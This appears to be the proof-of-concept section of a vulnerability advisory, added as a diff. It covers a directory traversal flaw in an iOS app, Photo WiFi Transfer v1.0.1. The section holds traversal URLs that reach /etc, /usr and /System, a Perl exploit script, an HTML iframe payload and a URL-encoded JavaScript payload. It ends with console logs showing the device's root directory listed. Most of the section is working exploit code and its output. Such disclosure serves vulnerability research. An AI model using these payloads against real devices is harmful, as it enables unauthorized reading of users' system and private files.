@@ -1,0 +1,86 @@
+Proof of Concept (PoC):
+=======================
+The directory traversal web vulnerability can be exploited by attackers without privileged application user account and user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+Exception:
+50 /private/var/mobile/Applications/CFCEEF6E-AA35-42D6-84EC-BFB518F764B1/Documents/photo/../../etc/passwd No such file or directory.
+
+Standard Request:
+ftp://localhost:8080/../../Documents/
+
+PoC: Links
+ftp://localhost:8080/../../../../../../../../../../../../../../../../etc
+ftp://localhost:8080/../../../../../../../../../../../../../../../../usr/
+ftp://localhost:8080/../../../../../../../../../../../../../../../../Applications/
+ftp://localhost:8080/../../../../../../../../../../../../../../../../System/
+
+
+Exploit: PoC (PL)
+#!/usr/bin/perl
+use LWP::Simple;
+print "-------------------------------------------\n";
+print "-= Photo WiFi Transfer v1.0.1 - PoC Directory Traversal=-\n";
+print "-------------------------------------------\n\n";
+
+print "Target(ftp://localhost:8080/)\> ";
+chomp($targ = <STDIN>);
+
+print "Path: (/fn25/)\>";
+chomp($path=<STDIN>);
+
+$url = "../../../../../../../../etc/";
+$page = get("http://".$targ.$path.$url) || die "[-] Unable to retrieve: $!";
+print "[+] Connected to: $page\n";
+
+
+Exploit: PoC (HTML)
+<html>
+<head><body><title></title>
+<iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../etc>
+<iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../usr/>
+<iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../Applications/>
+<iframe src=ftp://localhost:8080/../../../../../../../../../../../../../../../../System/>
+</body></head>
+<html>
+
+
+Exploit: PoC (JS)
+<script language=JavaScript>m='%3Chtml%3E%0A%3Chead%3E%3Cbody%3E%3Ctitle%3E%3C/title%3E%0A%3Ciframe%20src%3Dftp%3A//
+localhost%3A8080/../../../../../../../../../../../../../../../../etc%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/
+../../../../../../../../../../../../../../../../usr/%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/../../../../../
+../../../../../../../../../../../Applications/%3E%0A%3Ciframe%20src%3Dftp%3A//localhost%3A8080/../../../../../../../
+../../../../../../../../../System/%3E%0A%3C/body%3E%3C/head%3E%0A%3Chtml%3E';d=unescape(m);document.write(d);</script>
+
+
+--- PoC Console Logs ---
+Applications		14.03.2014 	19:06:00
+Developer		18.08.2013 	06:19:00
+Library			20.10.2013 	06:32:00
+System			17.10.2013 	08:08:00
+bin			03.07.2014 	18:13:00
+cores			18.08.2013 	05:56:00
+Datei:etc	1 KB 	20.10.2013 	06:32:00
+private			05.01.2014 	22:18:00
+sbin			03.07.2014 	18:13:00
+Datei:tmp	1 KB 	20.10.2013 	06:32:00
+usr			20.10.2013 	06:23:00
+Datei:var	1 KB 	20.10.2013 	06:32:00
+
+300: ftp://localhost:8080/../../../../../../../../
+200: filename content-length last-modified file-type
+201: "Applications" 0 Sun%2C%2014%20Mar%202014%2019%3A06%3A00 DIRECTORY 
+201: "Developer" 0 Sun%2C%2018%20Aug%202013%2006%3A19%3A00 DIRECTORY 
+201: "Library" 0 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 DIRECTORY 
+201: "System" 0 Sun%2C%2017%20Oct%202013%2008%3A08%3A00 DIRECTORY 
+201: "bin" 0 Sun%2C%2003%20Jul%202014%2018%3A13%3A00 DIRECTORY 
+201: "cores" 0 Sun%2C%2018%20Aug%202013%2005%3A56%3A00 DIRECTORY 
+201: "etc" 11 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE 
+201: "private" 0 Sun%2C%2005%20Jan%202014%2022%3A18%3A00 DIRECTORY 
+201: "sbin" 0 Sun%2C%2003%20Jul%202014%2018%3A13%3A00 DIRECTORY 
+201: "tmp" 15 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE 
+201: "usr" 0 Sun%2C%2020%20Oct%202013%2006%3A23%3A00 DIRECTORY 
+201: "var" 11 Sun%2C%2020%20Oct%202013%2006%3A32%3A00 FILE 
+
+Note: The traversal becomes visible after the 5th path/folder request and affects like regular the full app path via web-server. (_eTiGb+6)
+
